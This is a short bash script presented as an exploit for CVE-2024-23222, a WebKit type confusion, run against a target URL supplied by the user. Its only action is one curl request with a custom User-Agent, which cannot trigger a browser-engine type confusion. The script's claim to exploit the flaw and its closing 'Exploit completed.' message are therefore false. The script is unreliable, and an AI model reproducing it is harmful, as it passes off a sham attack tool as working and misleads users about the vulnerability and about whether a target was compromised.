#!/bin/bash
# CVE-2024-23222: WebKit Type Confusion
# Usage: webkit_type_confusion.sh <target_url>

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "Exploiting WebKit type confusion on: $TARGET_URL"

curl -s -o /dev/null $TARGET_URL -H "User-Agent: exploit_type_confusion"

echo "Exploit completed."
